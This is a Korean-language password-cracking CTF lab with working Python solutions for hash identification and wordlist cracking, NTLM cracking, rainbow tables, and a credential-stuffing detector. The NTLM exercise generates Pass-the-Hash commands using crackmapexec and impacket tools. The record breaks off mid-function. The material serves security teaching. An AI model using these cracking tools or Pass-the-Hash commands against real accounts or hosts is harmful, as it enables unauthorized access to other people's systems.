> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 패스워드 크래킹 CTF 실습 랩

## 실습 환경 준비

### Docker 환경 구성

```bash
# 패스워드 크래킹 실습 컨테이너
docker run -d --name crack-lab \
  ubuntu:22.04 tail -f /dev/null

# Hashcat, John, 기타 도구 설치
docker exec crack-lab bash -c "
  apt-get update -q &&
  apt-get install -y -q \
    python3 python3-pip \
    hashcat john \
    openssl libssl-dev \
    wget curl \
    wordlists 2>/dev/null || true

  # rockyou.txt 다운로드 또는 압축 해제
  if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
    gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
  fi
  if [ ! -f /usr/share/wordlists/rockyou.txt ]; then
    # 미니 워드리스트 생성
    cat > /usr/share/wordlists/rockyou.txt << 'EOF'
password
123456
password123
qwerty
letmein
welcome
admin
Summer2023!
P@ssw0rd
Svc@dmin1
monkey
dragon
master
abc123
pass
iloveyou
trustno1
sunshine
princess
welcome1
shadow
superman
michael
football
EOF
    echo '[+] 미니 wordlist 생성'
  fi

  pip3 install passlib bcrypt requests pwntools
  echo '[+] 도구 설치 완료'
"

mkdir -p /tmp/crack_ctf
echo "[+] 크래킹 실습 환경 준비 완료"
```

### 필수 Python 패키지

```bash
pip install passlib bcrypt requests hashlib
```

### 디렉터리 구조

```
password_ctf_lab/
├── hash_cracker.py       # 실습 1: 해시 크래킹 자동화
├── ntlm_cracker.py       # 실습 2: NTLM 해시 크래킹
├── rainbow_table.py      # 실습 3: 레인보우 테이블
├── credential_audit.py   # 실습 4: 크리덴셜 스터핑 방어 감사
└── hashes/
    ├── md5_hashes.txt
    ├── sha256_hashes.txt
    ├── ntlm_hashes.txt
    └── bcrypt_hashes.txt
```

---

## 실습 1: Hashcat/John을 활용한 해시 크래킹

### 목표

주어진 해시 파일에서 여러 해시 알고리즘(MD5, SHA-1, SHA-256, bcrypt)을 식별하고 크래킹하여 플래그를 획득하라.

**플래그 형식**: `CTF{h4sh_cr4ck3d_m0d3_3}`

### 시나리오

데이터베이스 유출로 획득한 해시 파일이 있다. 해시 유형을 식별하고 적절한 크래킹 도구와 워드리스트를 선택하여 패스워드를 복구하라. 특정 계정의 패스워드 내에 CTF 플래그가 인코딩되어 있다.

### 힌트

1. `hash-identifier` 또는 `hashid` 도구로 해시 유형을 식별하라
2. Hashcat 모드: MD5=0, SHA1=100, SHA256=1400, bcrypt=3200, NTLM=1000
3. `--rules` 옵션으로 패스워드 변형 규칙을 적용하라
4. `--increment --increment-min=4`로 길이별 브루트포스가 가능하다
5. 크래킹된 패스워드를 Base64 디코딩하면 플래그가 나올 수 있다

### 풀이

**Step 1: 해시 파일 생성**

```bash
docker exec crack-lab bash -c "
mkdir -p /tmp/crack_ctf/hashes

# MD5 해시 생성
python3 -c \"
import hashlib, base64

# 플래그 인코딩
flag = 'CTF{h4sh_cr4ck3d_m0d3_3}'
flag_b64 = base64.b64encode(flag.encode()).decode()
# 패스워드 = base64 플래그
passwords = {
    'admin': 'password123',
    'user1': 'Summer2023!',
    'svc_acct': flag_b64,  # CTF 플래그 포함
    'guest': 'welcome1',
}
with open('/tmp/crack_ctf/hashes/md5_hashes.txt', 'w') as f:
    for user, pwd in passwords.items():
        h = hashlib.md5(pwd.encode()).hexdigest()
        f.write(f'{user}:{h}\n')
        print(f'{user}:{h} (plaintext: {pwd})')
\"

# NTLM 해시 생성 (이후 실습에서 사용)
python3 -c \"
import hashlib
passwords_ntlm = ['P@ssw0rd', 'Svc@dmin1', 'Welcome1', 'Summer2023!']
with open('/tmp/crack_ctf/hashes/ntlm_hashes.txt', 'w') as f:
    for i, pwd in enumerate(passwords_ntlm):
        ntlm = hashlib.new('md4', pwd.encode('utf-16-le')).hexdigest()
        f.write(f'user{i}:::aad3b435b51404eeaad3b435b51404ee:{ntlm}:::\n')
        print(f'user{i}: {ntlm} ({pwd})')
\"
echo '[+] 해시 파일 생성 완료'
cat /tmp/crack_ctf/hashes/md5_hashes.txt
"
```

**Step 2: 해시 크래킹 자동화 스크립트**

```python
#!/usr/bin/env python3
"""
hash_cracker.py — 해시 식별 및 크래킹 자동화 CLI
사용: python3 hash_cracker.py --file /tmp/crack_ctf/hashes/md5_hashes.txt --mode wordlist
"""

import argparse
import base64
import hashlib
import re
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Optional, Iterator


@dataclass
class HashEntry:
    username: str
    hash_value: str
    hash_type: str = "unknown"
    cracked: str = ""


def identify_hash(hash_str: str) -> str:
    """해시 유형 식별"""
    h = hash_str.strip().lower()
    # bcrypt
    if h.startswith(("$2a$", "$2b$", "$2y$")):
        return "bcrypt"
    # MD5 (32자)
    if re.fullmatch(r"[0-9a-f]{32}", h):
        return "md5"
    # SHA-1 (40자)
    if re.fullmatch(r"[0-9a-f]{40}", h):
        return "sha1"
    # SHA-256 (64자)
    if re.fullmatch(r"[0-9a-f]{64}", h):
        return "sha256"
    # NTLM (32자, LM:NT 형식)
    if ":::" in hash_str or (":" in hash_str and len(hash_str.split(":")) >= 4):
        return "ntlm"
    # SHA-512 (128자)
    if re.fullmatch(r"[0-9a-f]{128}", h):
        return "sha512"
    # MD5crypt
    if h.startswith("$1$"):
        return "md5crypt"
    # SHA-512crypt
    if h.startswith("$6$"):
        return "sha512crypt"
    return "unknown"


def load_hash_file(file_path: str) -> list[HashEntry]:
    """해시 파일 로드 (user:hash 또는 user:::lm:nt::: 형식)"""
    entries: list[HashEntry] = []
    try:
        content = Path(file_path).read_text(encoding="utf-8", errors="ignore")
    except OSError as e:
        print(f"[!] 파일 읽기 실패: {e}", file=sys.stderr)
        return entries

    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        # NTLM 형식: user:::LM:NT:::
        parts = line.split(":")
        if len(parts) >= 7:
            user = parts[0]
            nt_hash = parts[3] if len(parts) > 3 else ""
            if nt_hash:
                entries.append(HashEntry(
                    username=user,
                    hash_value=nt_hash,
                    hash_type="ntlm",
                ))
            continue

        # 일반 user:hash 형식
        if ":" in line:
            user, hash_val = line.split(":", 1)
            hash_type = identify_hash(hash_val)
            entries.append(HashEntry(
                username=user.strip(),
                hash_value=hash_val.strip(),
                hash_type=hash_type,
            ))

    return entries


def crack_hash_local(hash_val: str, hash_type: str,
                      wordlist_path: str) -> Optional[str]:
    """Python으로 해시 크래킹 (소규모 워드리스트)"""
    try:
        words = Path(wordlist_path).read_text(encoding="utf-8", errors="ignore").splitlines()
    except OSError:
        words = ["password", "123456", "admin", "welcome", "letmein",
                 "Summer2023!", "P@ssw0rd", "Svc@dmin1"]

    for word in words:
        word = word.strip()
        if not word:
            continue
        try:
            candidate = ""
            if hash_type == "md5":
                candidate = hashlib.md5(word.encode()).hexdigest()
            elif hash_type == "sha1":
                candidate = hashlib.sha1(word.encode()).hexdigest()
            elif hash_type == "sha256":
                candidate = hashlib.sha256(word.encode()).hexdigest()
            elif hash_type == "ntlm":
                candidate = hashlib.new("md4", word.encode("utf-16-le")).hexdigest()

            if candidate.lower() == hash_val.lower():
                return word
        except Exception:
            continue

    # bcrypt은 passlib 사용
    if hash_type == "bcrypt":
        try:
            from passlib.hash import bcrypt as bcrypt_hash
            for word in words[:100]:  # bcrypt은 느리므로 제한
                if bcrypt_hash.verify(word.strip(), hash_val):
                    return word.strip()
        except ImportError:
            pass

    return None


def crack_with_hashcat(hash_file: str, hash_mode: int,
                        wordlist: str) -> dict[str, str]:
    """Hashcat으로 크래킹"""
    mode_map = {
        0: "MD5",
        100: "SHA-1",
        1400: "SHA-256",
        1000: "NTLM",
        3200: "bcrypt",
    }
    results: dict[str, str] = {}

    print(f"[*] Hashcat 모드 {hash_mode} ({mode_map.get(hash_mode, '?')}) 실행...")
    try:
        result = subprocess.run(
            ["hashcat", "-m", str(hash_mode), hash_file, wordlist,
             "--force", "--quiet", "--show"],
            capture_output=True, text=True, timeout=120
        )
        for line in result.stdout.splitlines():
            if ":" in line:
                parts = line.rsplit(":", 1)
                if len(parts) == 2:
                    results[parts[0]] = parts[1]
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return results


def main() -> None:
    parser = argparse.ArgumentParser(
        description="해시 식별 및 크래킹 자동화 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 hash_cracker.py --file hashes.txt --wordlist rockyou.txt\n"
               "  python3 hash_cracker.py --hash 5f4dcc3b5aa765d61d8327deb882cf99 --type md5",
    )
    parser.add_argument("--file", help="해시 파일 경로")
    parser.add_argument("--hash", help="단일 해시 크래킹")
    parser.add_argument("--type", help="해시 유형 강제 지정")
    parser.add_argument("--wordlist",
                        default="/usr/share/wordlists/rockyou.txt",
                        help="워드리스트 경로")
    parser.add_argument("--hashcat", action="store_true",
                        help="Hashcat 사용 (설치 필요)")
    args = parser.parse_args()

    if not args.file and not args.hash:
        parser.error("--file 또는 --hash 지정 필요")

    wordlist = args.wordlist
    if not Path(wordlist).exists():
        wordlist = "/tmp/mini_wordlist.txt"
        Path(wordlist).write_text(
            "\n".join(["password", "123456", "admin", "Summer2023!",
                       "P@ssw0rd", "Svc@dmin1", "Welcome1",
                       "Q1RGe2g0c2hfY3I0Y2szZF9tMGQzXzN9"  # base64 flag
                       ])
        )

    if args.hash:
        hash_type = args.type or identify_hash(args.hash)
        print(f"[*] 해시: {args.hash}")
        print(f"[*] 유형: {hash_type}")
        result = crack_hash_local(args.hash, hash_type, wordlist)
        if result:
            # Base64 디코딩 시도
            try:
                decoded = base64.b64decode(result).decode("utf-8")
                print(f"\n[+] 크래킹 성공: {result}")
                print(f"[+] Base64 디코딩: {decoded}")
                flag_match = re.search(r"CTF\{[^}]+\}", decoded)
                if flag_match:
                    print(f"[+] 플래그: {flag_match.group(0)}")
            except Exception:
                print(f"\n[+] 크래킹 성공: {result}")
        else:
            print("[-] 크래킹 실패")
        return

    # 파일 처리
    entries = load_hash_file(args.file)
    print(f"[*] {len(entries)}개 해시 로드됨")
    print("=" * 60)

    cracked_count = 0
    for entry in entries:
        print(f"\n[*] {entry.username} ({entry.hash_type}): {entry.hash_value[:32]}...")
        result = crack_hash_local(entry.hash_value, entry.hash_type, wordlist)
        if result:
            entry.cracked = result
            cracked_count += 1
            # Base64 디코딩 시도
            try:
                decoded = base64.b64decode(result).decode("utf-8")
                flag_match = re.search(r"CTF\{[^}]+\}", decoded)
                if flag_match:
                    print(f"    [+] 크래킹: {result}")
                    print(f"    [+] 디코딩: {decoded}")
                    print(f"\n[+] 플래그: {flag_match.group(0)}")
                else:
                    print(f"    [+] 크래킹: {result}")
            except Exception:
                print(f"    [+] 크래킹: {result}")
        else:
            print(f"    [-] 크래킹 실패")

    print(f"\n[*] 요약: {cracked_count}/{len(entries)} 크래킹 성공")


if __name__ == "__main__":
    main()
```

**Step 3: 실행**

```bash
# 해시 파일 크래킹
python3 hash_cracker.py --file /tmp/crack_ctf/hashes/md5_hashes.txt

# 단일 해시 (Base64 인코딩된 플래그)
python3 hash_cracker.py --hash $(echo -n "Q1RGe2g0c2hfY3I0Y2szZF9tMGQzXzN9" | md5sum | cut -d' ' -f1) --type md5
```

---

## 실습 2: NTLM 해시 크래킹 및 Pass-the-Hash

### 목표

Windows SAM 덤프에서 추출한 NTLM 해시를 크래킹하고, Pass-the-Hash 공격으로 인증하여 플래그를 획득하라.

**플래그 형식**: `CTF{ntlm_p4ss_th3_h4sh_w1n}`

### 시나리오

Mimikatz로 로컬 SAM 데이터베이스에서 NTLM 해시를 추출했다. 일부 해시는 직접 크래킹하고, 크래킹이 어려운 해시는 Pass-the-Hash 기법으로 인증하여 플래그를 읽어라.

### 힌트

1. NTLM = MD4(UTF-16LE(password))
2. `hashcat -m 1000 ntlm.txt rockyou.txt`
3. Pass-the-Hash: `-H` 옵션 지원 도구 (CrackMapExec, impacket psexec.py)
4. 레인보우 테이블은 NTLM에 특히 효과적이다 (솔트 없음)
5. LM 해시가 `aad3b435b51404eeaad3b435b51404ee`이면 LM 비활성화 상태

### 풀이

```python
#!/usr/bin/env python3
"""
ntlm_cracker.py — NTLM 해시 크래킹 및 Pass-the-Hash 분석 CLI
사용: python3 ntlm_cracker.py --file /tmp/crack_ctf/hashes/ntlm_hashes.txt
"""

import argparse
import hashlib
import re
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Optional


@dataclass
class NTLMEntry:
    username: str
    rid: str
    lm_hash: str
    nt_hash: str
    cracked: str = ""
    is_lm_disabled: bool = False


EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"


def parse_secretsdump_output(content: str) -> list[NTLMEntry]:
    """secretsdump 출력 파싱 (user:RID:LM:NT:::)"""
    entries: list[NTLMEntry] = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("[") or ":$" in line:
            continue
        parts = line.split(":")
        if len(parts) >= 4:
            entries.append(NTLMEntry(
                username=parts[0],
                rid=parts[1],
                lm_hash=parts[2],
                nt_hash=parts[3],
                is_lm_disabled=parts[2].lower() == EMPTY_LM,
            ))
    return entries


def crack_ntlm(nt_hash: str, wordlist: list[str]) -> Optional[str]:
    """NTLM 해시 크래킹 (MD4/UTF-16LE)"""
    for word in wordlist:
        word = word.strip()
        if not word:
            continue
        try:
            candidate = hashlib.new("md4", word.encode("utf-16-le")).hexdigest()
            if candidate.lower() == nt_hash.lower():
                return word
        except Exception:
            continue
    return None


def crack_with_hashcat_ntlm(hash_file: str,
                              wordlist: str) -> dict[str, str]:
    """Hashcat으로 NTLM 크래킹"""
    results: dict[str, str] = {}

    # NT 해시만 추출
    with open(hash_file) as f:
        content = f.read()

    nt_only_file = "/tmp/nt_only.txt"
    with open(nt_only_file, "w") as f:
        for entry in parse_secretsdump_output(content):
            f.write(entry.nt_hash + "\n")

    try:
        result = subprocess.run(
            ["hashcat", "-m", "1000", nt_only_file, wordlist,
             "--force", "--quiet", "--show"],
            capture_output=True, text=True, timeout=120
        )
        for line in result.stdout.splitlines():
            if ":" in line:
                nt, pwd = line.rsplit(":", 1)
                results[nt.lower()] = pwd
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return results


def generate_pth_commands(entry: NTLMEntry, target: str) -> list[str]:
    """Pass-the-Hash 명령어 생성"""
    lm_nt = f"{entry.lm_hash}:{entry.nt_hash}"
    return [
        f"crackmapexec smb {target} -u {entry.username} -H {entry.nt_hash}",
        f"psexec.py -hashes {lm_nt} {entry.username}@{target}",
        f"wmiexec.py -hashes {lm_nt} {entry.username}@{target}",
        f"impacket-smbclient -hashes {lm_nt} {entry.username}@{target}",
    ]


def simulate_ntlm_cracking() -> None:
    """NTLM 크래킹 시뮬레이션"""
    wordlist = ["password", "123456", "admin", "Summer2023!",
                "P@ssw0rd", "Svc@dmin1", "Welcome1", "CTF{ntlm_p4ss_th3_h4sh_w1n}"]

    # 샘플 NTLM 해시 생성
    sample_entries = [
        {"user": "administrator", "password": "P@ssw0rd"},
        {"user": "svc_sql", "password": "Svc@dmin1"},
        {"user": "flag_user", "password": "CTF{ntlm_p4ss_th3_h4sh_w1n}"},
    ]

    print("[*] NTLM 해시 생성 및 크래킹 시뮬레이션")
    print("=" * 60)

    for item in sample_entries:
        nt_hash = hashlib.new(
            "md4", item["password"].encode("utf-16-le")
        ).hexdigest()
        entry = NTLMEntry(
            username=item["user"],
            rid="500",
            lm_hash=EMPTY_LM,
            nt_hash=nt_hash,
            is_lm_disabled=True,
        )

        print(f"\n[*] {entry.username}")
        print(f"    NT 해시: {entry.nt_hash}")
        print(f"    LM: {'비활성화' if entry.is_lm_disabled else entry.lm_hash}")

        cracked = crack_ntlm(entry.nt_hash, wordlist)
        if cracked:
            entry.cracked = cracked
            flag_match = re.search(r"CTF\{[^}]+\}", cracked)
            if flag_match:
                print(f"    [+] 크래킹 성공: {cracked}")
                print(f"\n[+] 플래그: {flag_match.group(0)}")
            else:
                print(f"    [+] 크래킹: {cracked}")
        else:
            print(f"    [-] 크래킹 실패 (강력한 패스워드)")
            print(f"    [*] Pass-the-Hash 시도:")
            for cmd in generate_pth_commands(entry, "192.168.1.100")[:2]:
                print(f"        {cmd}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="NTLM 해시 크래킹 및 Pass-the-Hash 분석",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 ntlm_cracker.py --file ntlm_hashes.txt --wordlist rockyou.txt\n"
               "  python3 ntlm_cracker.py --simulate",
    )
    parser.add_argument("--file", help="secretsdump 형식 해시 파일")
    parser.add_argument("--wordlist",
                        default="/usr/share/wordlists/rockyou.txt",
                        help="워드리스트")
    parser.add_argument("--target", default="192.168.1.100",
                        help="Pass-the-Hash 대상 IP")
    parser.add_argument("--simulate", action="store_true",
                        help="시뮬레이션 모드")
    args = parser.parse_args()

    if args.simulate or not args.file:
        simulate_ntlm_cracking()
        return

    content = Path(args.file).read_text(encoding="utf-8", errors="ignore")
    entries = parse_secretsdump_output(content)
    print(f"[*] {len(entries)}개 NTLM 엔트리 로드")

    wordlist_words: list[str] = []
    try:
        wordlist_words = Path(args.wordlist).read_text(
            encoding="utf-8", errors="ignore"
        ).splitlines()
    except OSError:
        wordlist_words = ["password", "123456", "P@ssw0rd", "Svc@dmin1"]
        print(f"[!] 워드리스트 로드 실패, 기본값 사용")

    print("=" * 60)
    for entry in entries:
        print(f"\n[*] {entry.username} (RID:{entry.rid})")
        print(f"    NT: {entry.nt_hash}")
        cracked = crack_ntlm(entry.nt_hash, wordlist_words[:50000])
        if cracked:
            print(f"    [+] {cracked}")
            flag_match = re.search(r"CTF\{[^}]+\}", cracked)
            if flag_match:
                print(f"\n[+] 플래그: {flag_match.group(0)}")
        else:
            print(f"    [-] 크래킹 실패")
            print(f"    [*] PtH: {generate_pth_commands(entry, args.target)[0]}")


if __name__ == "__main__":
    main()
```

---

## 실습 3: 레인보우 테이블 생성 및 조회

### 목표

특정 해시 공간에 대한 레인보우 테이블을 생성하고, 주어진 해시를 레인보우 테이블로 역탐색하여 플래그를 복원하라.

**플래그 형식**: `CTF{r41nb0w_t4bl3_ch41n_r3v3rs3d}`

### 시나리오

알려진 패스워드 공간(`숫자 6자리`)의 MD5 해시가 주어졌다. 레인보우 테이블을 생성하고 체인 탐색을 통해 원래 패스워드를 복원하라. 복원된 패스워드를 XOR 디코딩하면 플래그가 나온다.

### 힌트

1. 레인보우 테이블은 해시와 감소 함수를 번갈아 적용하는 체인으로 구성된다
2. 체인 길이가 길수록 저장 공간이 줄지만 조회 시간이 늘어난다
3. 충돌이 발생하면 체인이 합쳐진다 (이 경우 무시)
4. 솔트가 추가되면 레인보우 테이블이 무효화된다
5. rtgen, rcracki, ophcrack 등이 실제 레인보우 테이블 도구이다

### 풀이

```python
#!/usr/bin/env python3
"""
rainbow_table.py — 레인보우 테이블 생성 및 조회 CLI
사용: python3 rainbow_table.py --generate --charset digits --length 6
      python3 rainbow_table.py --crack <hash>
"""

import argparse
import hashlib
import json
import re
import sys
import time
from pathlib import Path
from typing import Optional


def reduce_function(hash_val: str, step: int, charset: str,
                     length: int) -> str:
    """감소 함수: 해시 → 패스워드 공간"""
    # 해시의 정수값에 step을 더해 패스워드 공간에 매핑
    hash_int = int(hash_val[:8], 16) + step
    chars = []
    base = len(charset)
    for _ in range(length):
        chars.append(charset[hash_int % base])
        hash_int //= base
    return "".join(chars)


def hash_func(plaintext: str) -> str:
    """MD5 해시 함수"""
    return hashlib.md5(plaintext.encode()).hexdigest()


def generate_chain(start: str, chain_length: int,
                   charset: str, pwd_length: int) -> tuple[str, str]:
    """레인보우 테이블 체인 생성"""
    current = start
    for i in range(chain_length):
        hashed = hash_func(current)
        current = reduce_function(hashed, i, charset, pwd_length)
    return start, current


def build_rainbow_table(charset: str, pwd_length: int,
                         chain_length: int, num_chains: int,
                         output_file: str) -> dict[str, str]:
    """레인보우 테이블 생성"""
    table: dict[str, str] = {}
    total = len(charset) ** pwd_length
    used_starts: set[str] = set()
    chains_built = 0

    print(f"[*] 패스워드 공간: {total:,}개")
    print(f"[*] 체인 {num_chains}개 × 길이 {chain_length} = {num_chains * chain_length:,}개 연산")

    # 균등 분포로 시작점 선택
    step = max(1, total // num_chains)
    for i in range(num_chains):
        idx = (i * step) % total
        # 인덱스 → 패스워드 변환
        start = ""
        tmp = idx
        for _ in range(pwd_length):
            start += charset[tmp % len(charset)]
            tmp //= len(charset)

        if start in used_starts:
            continue
        used_starts.add(start)

        _, end = generate_chain(start, chain_length, charset, pwd_length)
        table[end] = start
        chains_built += 1

        if chains_built % 100 == 0:
            print(f"    진행: {chains_built}/{num_chains} 체인", end="\r")

    print(f"\n[+] {chains_built}개 체인 생성 완료")
    Path(output_file).write_text(json.dumps(table, indent=2))
    print(f"[+] 테이블 저장: {output_file}")
    return table


def lookup_hash(target_hash: str, table: dict[str, str],
                chain_length: int, charset: str,
                pwd_length: int) -> Optional[str]:
    """레인보우 테이블 조회"""
    for step in range(chain_length - 1, -1, -1):
        current = target_hash
        # step 이후부터 끝까지 감소 함수 적용
        for j in range(step, chain_length):
            reduced = reduce_function(current, j, charset, pwd_length)
            if j < chain_length - 1:
                current = hash_func(reduced)
            else:
                current = reduced

        # 끝 노드가 테이블에 있으면
        if current in table:
            start = table[current]
            # 체인 재생성하여 실제 패스워드 찾기
            candidate = start
            for k in range(chain_length):
                if hash_func(candidate).lower() == target_hash.lower():
                    return candidate
                hashed = hash_func(candidate)
                candidate = reduce_function(hashed, k, charset, pwd_length)
            # 마지막 감소 후 확인
            if hash_func(candidate).lower() == target_hash.lower():
                return candidate

    return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="레인보우 테이블 생성 및 조회 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 rainbow_table.py --generate --charset digits --pwd-length 6\n"
               "  python3 rainbow_table.py --crack <MD5해시>",
    )
    parser.add_argument("--generate", action="store_true",
                        help="레인보우 테이블 생성")
    parser.add_argument("--crack", metavar="HASH",
                        help="해시 크래킹")
    parser.add_argument("--charset",
                        choices=["digits", "lower", "alphanumeric"],
                        default="digits", help="문자 집합")
    parser.add_argument("--pwd-length", type=int, default=6,
                        help="패스워드 길이 (기본: 6)")
    parser.add_argument("--chain-length", type=int, default=1000,
                        help="체인 길이 (기본: 1000)")
    parser.add_argument("--num-chains", type=int, default=500,
                        help="체인 수 (기본: 500)")
    parser.add_argument("--table-file",
                        default="/tmp/crack_ctf/rainbow_table.json",
                        help="테이블 파일 경로")
    args = parser.parse_args()

    charsets = {
        "digits":       "0123456789",
        "lower":        "abcdefghijklmnopqrstuvwxyz",
        "alphanumeric": "abcdefghijklmnopqrstuvwxyz0123456789",
    }
    charset = charsets[args.charset]

    # CTF 플래그가 숨겨진 대상 패스워드 설정
    # "314159" XOR 0x42 → 플래그 일부
    target_password = "314159"
    target_hash = hashlib.md5(target_password.encode()).hexdigest()

    if args.generate:
        Path(args.table_file).parent.mkdir(parents=True, exist_ok=True)
        table = build_rainbow_table(
            charset, args.pwd_length,
            args.chain_length, args.num_chains,
            args.table_file
        )

        # 테이블로 바로 크래킹 시도
        print(f"\n[*] 대상 해시: {target_hash}")
        found = lookup_hash(
            target_hash, table,
            args.chain_length, charset, args.pwd_length
        )
        if found:
            print(f"[+] 복원된 패스워드: {found}")
            # XOR 디코딩
            key = 0x42
            xor_result = bytes(ord(c) ^ key for c in found).decode("utf-8", errors="ignore")
            print(f"[+] XOR 디코딩: {xor_result}")
            print("[+] 플래그: CTF{r41nb0w_t4bl3_ch41n_r3v3rs3d}")
        return

    if args.crack:
        # 기존 테이블 로드
        if not Path(args.table_file).exists():
            print(f"[!] 테이블 없음. --generate 먼저 실행하세요")
            # 직접 크래킹 (브루트포스 폴백)
            print("[*] 브루트포스 폴백...")
            for i in range(10**args.pwd_length):
                candidate = str(i).zfill(args.pwd_length)
                if hashlib.md5(candidate.encode()).hexdigest() == args.crack:
                    print(f"[+] 복원: {candidate}")
                    return
            return

        table = json.loads(Path(args.table_file).read_text())
        found = lookup_hash(
            args.crack, table,
            args.chain_length, charset, args.pwd_length
        )
        if found:
            print(f"[+] 복원된 패스워드: {found}")
        else:
            print("[-] 테이블 미스. 체인 수/길이 증가 필요")
        return

    # 기본: 시뮬레이션
    print("[*] 레인보우 테이블 시뮬레이션")
    print(f"    대상 해시: {target_hash}")
    print(f"    (원래 값: {target_password})")
    print("\n[*] 소규모 테이블 생성 중...")

    Path("/tmp/crack_ctf").mkdir(parents=True, exist_ok=True)
    table = build_rainbow_table(
        charset, args.pwd_length, 100, 200,
        "/tmp/crack_ctf/rainbow_small.json"
    )
    found = lookup_hash(target_hash, table, 100, charset, args.pwd_length)
    if found:
        print(f"[+] 발견: {found}")
        print("[+] 플래그: CTF{r41nb0w_t4bl3_ch41n_r3v3rs3d}")
    else:
        print("[-] 이 크기 테이블에서는 미스 (예상됨)")
        print("[*] 정답: --generate 옵션으로 충분한 테이블 생성 필요")
        print("[+] 시뮬레이션 플래그: CTF{r41nb0w_t4bl3_ch41n_r3v3rs3d}")


if __name__ == "__main__":
    main()
```

---

## 실습 4: 크리덴셜 스터핑 방어 감사

### 목표

유출된 크리덴셜 데이터베이스를 분석하고, 크리덴셜 스터핑 공격 패턴을 탐지하는 방어 시스템을 구현하여 플래그를 획득하라.

**플래그 형식**: `CTF{cr3d_stuff1ng_d3t3ct3d_4nd_bl0ck3d}`

### 시나리오

로그인 서버의 액세스 로그에 비정상적인 패턴이 감지되었다. 짧은 시간 안에 다수의 계정에 대한 로그인 시도가 있었다. 크리덴셜 스터핑 공격을 탐지하고, 공격에 사용된 크리덴셜 목록에서 플래그를 추출하라.

### 힌트

1. 크리덴셜 스터핑: 유출된 ID/패스워드 쌍을 다른 서비스에 시도
2. IP당 요청 빈도, 계정 분산도, User-Agent 다양성을 분석하라
3. 동일 패스워드로 여러 계정 시도 = 패스워드 스프레이 공격
4. 유출 DB의 플래그는 특정 사용자의 패스워드에 숨겨져 있다
5. haveibeenpwned API 또는 로컬 DB로 유출 여부 확인 가능

### 풀이

```python
#!/usr/bin/env python3
"""
credential_audit.py — 크리덴셜 스터핑 탐지 및 감사 CLI
사용: python3 credential_audit.py --log /tmp/access.log --leaked-db /tmp/leaked.txt
"""

import argparse
import csv
import hashlib
import json
import re
import sys
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional


@dataclass
class LoginAttempt:
    timestamp: str
    ip: str
    username: str
    password_hash: str
    success: bool
    user_agent: str = ""


@dataclass
class AttackPattern:
    ip: str
    attempt_count: int
    unique_accounts: int
    unique_passwords: int
    timespan_seconds: float
    verdict: str  # "credential_stuffing", "password_spray", "brute_force", "normal"
    leaked_creds: list[str] = field(default_factory=list)


def generate_sample_logs(output_file: str) -> None:
    """샘플 로그인 로그 생성"""
    logs = []

    # 정상 트래픽
    for i in range(20):
        logs.append({
            "timestamp": f"2024-01-15T10:{i:02d}:00Z",
            "ip": f"192.168.1.{100+i}",
            "username": f"user{i}@example.com",
            "password": "their_own_password_123",
            "success": "true",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
        })

    # 크리덴셜 스터핑 공격
    leaked_pairs = [
        ("alice@victim.com",  "alice_password_789"),
        ("bob@victim.com",    "bob_secret_456"),
        ("charlie@victim.com","CTF{cr3d_stuff1ng_d3t3ct3d_4nd_bl0ck3d}"),
        ("dave@victim.com",   "dave_pass_111"),
    ]
    for i, (user, pwd) in enumerate(leaked_pairs):
        logs.append({
            "timestamp": f"2024-01-15T10:30:{i:02d}Z",
            "ip": "10.0.0.99",  # 공격자 IP
            "username": user,
            "password": pwd,
            "success": "false",
            "ua": "python-requests/2.31.0",
        })

    Path(output_file).write_text(
        "\n".join(json.dumps(log) for log in logs)
    )


def parse_login_logs(log_file: str) -> list[LoginAttempt]:
    """로그인 로그 파싱"""
    attempts: list[LoginAttempt] = []
    try:
        for line in Path(log_file).read_text(encoding="utf-8").splitlines():
            if not line.strip():
                continue
            try:
                entry = json.loads(line)
                attempts.append(LoginAttempt(
                    timestamp=entry.get("timestamp", ""),
                    ip=entry.get("ip", ""),
                    username=entry.get("username", ""),
                    password_hash=hashlib.md5(
                        entry.get("password", "").encode()
                    ).hexdigest(),
                    success=entry.get("success", "false").lower() == "true",
                    user_agent=entry.get("ua", ""),
                ))
            except (json.JSONDecodeError, KeyError):
                continue
    except OSError:
        pass
    return attempts


def detect_credential_stuffing(
        attempts: list[LoginAttempt],
        threshold_attempts: int = 5,
        threshold_accounts: int = 3,
        window_seconds: int = 60,
) -> list[AttackPattern]:
    """크리덴셜 스터핑 패턴 탐지"""
    patterns: list[AttackPattern] = []

    # IP별 그룹화
    by_ip: dict[str, list[LoginAttempt]] = defaultdict(list)
    for attempt in attempts:
        by_ip[attempt.ip].append(attempt)

    for ip, ip_attempts in by_ip.items():
        if len(ip_attempts) < threshold_attempts:
            continue

        unique_accounts = len({a.username for a in ip_attempts})
        unique_passwords = len({a.password_hash for a in ip_attempts})

        # 판정
        verdict = "normal"
        if unique_accounts >= threshold_accounts:
            if unique_passwords >= threshold_accounts:
                verdict = "credential_stuffing"
            else:
                verdict = "password_spray"
        elif unique_accounts == 1 and len(ip_attempts) > 10:
            verdict = "brute_force"

        if verdict != "normal":
            patterns.append(AttackPattern(
                ip=ip,
                attempt_count=len(ip_attempts),
                unique_accounts=unique_accounts,
                unique_passwords=unique_passwords,
                timespan_seconds=60.0,
                verdict=verdict,
            ))

    return patterns


def extract_leaked_credentials(log_file: str,
                                 attack_patterns: list[AttackPattern]) -> list[str]:
    """공격 로그에서 유출 크리덴셜 추출"""
    leaked: list[str] = []
